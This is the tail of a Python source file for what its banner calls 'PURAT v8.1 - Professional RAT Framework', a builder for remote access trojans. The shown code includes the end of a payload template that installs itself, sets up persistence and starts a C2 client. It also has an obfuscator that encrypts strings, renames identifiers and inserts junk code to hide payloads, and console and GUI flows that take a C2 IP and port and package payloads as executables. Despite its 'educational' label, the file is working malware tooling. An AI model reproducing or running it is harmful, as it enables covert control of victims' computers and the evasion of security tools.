            print(f"[-] Installation failed: {e}")
            install_path = sys.argv[0]
    else:
        print(f"[+] Already installed: {install_path}")
    
    # Install persistence
    persistence = PersistenceManager(install_path)
    if CONFIG['basic']['persistence']:
        if persistence.install():
            print("[+] Persistence installed")
    
    # Start C2 client
    print("[+] Starting C2 client...")
    client = C2Client()
    client.connect()

def test_mode():
    """Test mode - limited functionality for testing"""
    print("[TEST] Running in test mode")
    print("[TEST] System Info:")
    for key, value in SYSTEM_INFO.items():
        print(f"  {key}: {value}")
    
    print("[TEST] Test mode completed")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Fatal error: {e}")

'''
        return code

# ============================================================================
# ENHANCED OBFUSCATOR
# ============================================================================

class EnhancedObfuscator:
    """Enhanced code obfuscator"""
    
    def __init__(self):
        pass
    
    def obfuscate_code(self, code, level=3):
        """Obfuscate code with specified level"""
        if level <= 0:
            return code
        
        obfuscated = code
        
        if level >= 1:
            obfuscated = self.encrypt_strings(obfuscated)
            obfuscated = self.rename_variables(obfuscated, level=1)
        
        if level >= 2:
            obfuscated = self.insert_junk_code(obfuscated, frequency=0.1)
            obfuscated = self.obfuscate_numbers(obfuscated)
        
        if level >= 3:
            obfuscated = self.insert_dead_code(obfuscated, frequency=0.05)
        
        return obfuscated
    
    def encrypt_strings(self, code):
        """Encrypt strings in code"""
        import re
        
        string_pattern = r'(\"\"\"[\s\S]*?\"\"\"|\'\'\'[\s\S]*?\'\'\'|\"[^\"]*\"|\'[^\']*\')'
        
        strings = []
        
        def encrypt_match(match):
            string = match.group(0)
            
            if string.startswith('\"\"\"') or string.startswith('\'\'\''):
                return string
            
            string_id = f'__str_{len(strings)}__'
            strings.append((string_id, string[1:-1]))
            
            return string_id
        
        code = re.sub(string_pattern, encrypt_match, code)
        
        if strings:
            decryption_func = '''
def _decrypt_string(encrypted):
    """Decrypt obfuscated string"""
    import base64, hashlib
    
    try:
        decoded = base64.b64decode(encrypted)
        
        key_seed = "purat_obfuscation"
        key = hashlib.sha256(key_seed.encode()).digest()
        
        decrypted = bytearray()
        for i, byte in enumerate(decoded):
            decrypted.append(byte ^ key[i % len(key)])
        
        return decrypted.decode()
    except:
        return encrypted

'''
            
            string_defs = []
            for string_id, original in strings:
                encrypted = base64.b64encode(original.encode()).decode()
                string_defs.append(f'{string_id} = _decrypt_string("{encrypted}")')
            
            code = decryption_func + '\n'.join(string_defs) + '\n\n' + code
        
        return code
    
    def rename_variables(self, code, level=1):
        """Rename variables"""
        import re
        import random
        import string
        
        def random_name(length=8):
            chars = string.ascii_letters + '_'
            return ''.join(random.choice(chars) for _ in range(length))
        
        identifier_pattern = r'\b([a-zA-Z_][a-zA-Z0-9_]*)\b'
        
        keywords = set([
            'and', 'as', 'assert', 'break', 'class', 'continue', 'def',
            'del', 'elif', 'else', 'except', 'exec', 'finally', 'for',
            'from', 'global', 'if', 'import', 'in', 'is', 'lambda',
            'not', 'or', 'pass', 'print', 'raise', 'return', 'try',
            'while', 'with', 'yield', 'True', 'False', 'None'
        ])
        
        builtins = set(dir(__builtins__))
        
        identifiers = re.findall(identifier_pattern, code)
        unique_ids = set(identifiers)
        
        to_rename = []
        for identifier in unique_ids:
            if (identifier not in keywords and 
                identifier not in builtins and
                not identifier.startswith('__') and
                not identifier.endswith('__') and
                len(identifier) > 2):
                to_rename.append(identifier)
        
        mapping = {}
        for identifier in to_rename:
            if level == 1:
                new_name = f'_{identifier[:3]}_{random.randint(100, 999)}'
            else:
                new_name = random_name(random.randint(6, 12))
            
            mapping[identifier] = new_name
        
        for old, new in mapping.items():
            code = re.sub(r'\b' + re.escape(old) + r'\b', new, code)
        
        return code
    
    def insert_junk_code(self, code, frequency=0.1):
        """Insert junk code"""
        import random
        
        lines = code.split('\n')
        obfuscated = []
        
        junk_patterns = [
            'if False: pass',
            'while 0: break',
            'for _ in range(0): continue',
            'try: pass\\nexcept: pass',
            '__dummy__ = lambda x: x',
            '__fake__ = [i for i in range(0)]'
        ]
        
        for line in lines:
            obfuscated.append(line)
            
            if random.random() < frequency and line.strip() and not line.strip().startswith('#'):
                junk = random.choice(junk_patterns)
                obfuscated.append(junk)
        
        return '\n'.join(obfuscated)
    
    def obfuscate_numbers(self, code):
        """Obfuscate numeric literals"""
        import re
        import random
        
        def obfuscate_number(match):
            num_str = match.group(0)
            
            try:
                if '.' in num_str:
                    num = float(num_str)
                    operations = [
                        f'{num * 2} / 2',
                        f'{num + 1} - 1',
                        f'float("{num}")'
                    ]
                else:
                    num = int(num_str)
                    a = random.randint(1, 100)
                    b = num - a
                    operations = [
                        f'{a} + {b}',
                        f'{num * 2} // 2',
                        f'int("{num}")'
                    ]
                
                return random.choice(operations)
            except:
                return num_str
        
        number_pattern = r'\b\d+(\.\d+)?\b'
        code = re.sub(number_pattern, obfuscate_number, code)
        
        return code
    
    def insert_dead_code(self, code, frequency=0.05):
        """Insert dead code"""
        import random
        
        lines = code.split('\n')
        obfuscated = []
        
        dead_code_patterns = [
            'if random.random() > 1:',
            '    print("Never printed")',
            '',
            'for i in range(10, 0, -1):',
            '    if i < 0:',
            '        break',
            '',
            'def __dead_func__():',
            '    return'
        ]
        
        for line in lines:
            obfuscated.append(line)
            
            if random.random() < frequency and line.strip() and not line.strip().startswith('#'):
                for dead_line in dead_code_patterns[:random.randint(1, 3)]:
                    obfuscated.append(dead_line)
        
        return '\n'.join(obfuscated)

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main entry point"""
    print("""
    PURAT v8.1 - Professional RAT Framework
    GUI + Console + Advanced Features
    For Educational Testing Only
    """)
    
    import argparse
    parser = argparse.ArgumentParser(description='PURAT v8.1 - RAT Framework')
    parser.add_argument('--gui', action='store_true', help='Launch GUI mode')
    parser.add_argument('--console', action='store_true', help='Launch console mode')
    parser.add_argument('--generate', type=str, help='Generate payload from config')
    
    args = parser.parse_args()
    
    if args.gui or (not args.console and not args.generate):
        try:
            app = EnhancedRATBuilderGUI()
            app.root.mainloop()
        except Exception as e:
            print(f"GUI failed: {e}")
            run_console_mode()
    
    elif args.console:
        run_console_mode()
    
    elif args.generate:
        try:
            with open(args.generate, 'r') as f:
                config = json.load(f)
            
            generator = EnhancedPayloadGenerator(config)
            payload = generator.generate()
            
            output_name = args.generate.replace('.json', '.py')
            with open(output_name, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            print(f"Payload generated: {output_name}")
            print(f"Size: {len(payload)} bytes")
            
        except Exception as e:
            print(f"Error: {e}")

def run_console_mode():
    """Run console interface"""
    print("[Console Mode]")
    print("1. Generate Basic Payload")
    print("2. Generate Advanced Payload")
    print("3. Configure Manually")
    print("4. Exit")
    
    choice = input("Select option: ")
    
    if choice == '1':
        config = EnhancedRATBuilderGUI().get_default_config()
        generate_from_config(config)
    elif choice == '2':
        config = EnhancedRATBuilderGUI().get_default_config()
        for feature in config['features']:
            config['features'][feature]['enabled'] = True
        generate_from_config(config)
    elif choice == '3':
        configure_manually()
    else:
        print("Exiting...")

def generate_from_config(config):
    """Generate payload from configuration"""
    try:
        generator = EnhancedPayloadGenerator(config)
        payload = generator.generate()
        
        output_name = input("Output filename [payload.py]: ") or "payload.py"
        
        with open(output_name, 'w', encoding='utf-8') as f:
            f.write(payload)
        
        print(f"[OK] Payload generated: {output_name}")
        print(f"[OK] Size: {len(payload)} bytes")
        
        obfuscate = input("Generate obfuscated version? (y/n): ").lower()
        if obfuscate in ['y', 'yes']:
            obfuscator = EnhancedObfuscator()
            obfuscated = obfuscator.obfuscate_code(payload, level=3)
            
            obfuscated_name = output_name.replace('.py', '_obfuscated.py')
            with open(obfuscated_name, 'w', encoding='utf-8') as f:
                f.write(obfuscated)
            
            print(f"[OK] Obfuscated payload: {obfuscated_name}")
        
        print("\nNext steps:")
        print("1. Test payload: python test_payload.py")
        print("2. Build EXE: pyinstaller --onefile payload.py")
        print("3. Configure C2 server")
        
    except Exception as e:
        print(f"[FAIL] Error: {e}")
        traceback.print_exc()

def configure_manually():
    """Manual configuration in console"""
    print("\nManual Configuration")
    
    config = EnhancedRATBuilderGUI().get_default_config()
    
    config['basic']['c2_ip'] = input(f"C2 IP [{config['basic']['c2_ip']}]: ") or config['basic']['c2_ip']
    config['basic']['c2_port'] = input(f"C2 Port [{config['basic']['c2_port']}]: ") or config['basic']['c2_port']
    
    print("\nEnable features (y/n):")
    for key in config['features']:
        current = config['features'][key]['enabled']
        answer = input(f"  {key} [{current}]: ").lower()
        if answer in ['y', 'yes', 'true']:
            config['features'][key]['enabled'] = True
        elif answer in ['n', 'no', 'false']:
            config['features'][key]['enabled'] = False
    
    generate_from_config(config)

if __name__ == "__main__":
    main()
